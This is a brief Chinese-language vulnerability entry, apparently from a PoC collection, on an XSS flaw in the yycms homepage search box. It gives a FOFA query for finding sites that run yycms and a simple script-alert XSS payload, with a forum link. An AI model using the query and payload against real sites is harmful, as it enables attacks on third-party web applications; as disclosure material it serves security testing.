# yycms首页搜索框 XSS漏洞


**FOFA:**

```
body="templets/yycms/css/"
```

**PoC：**

```
<script>alert(/xss/)</script>
```

ref：

https://forum.ywhack.com/thread-114996-1-1.html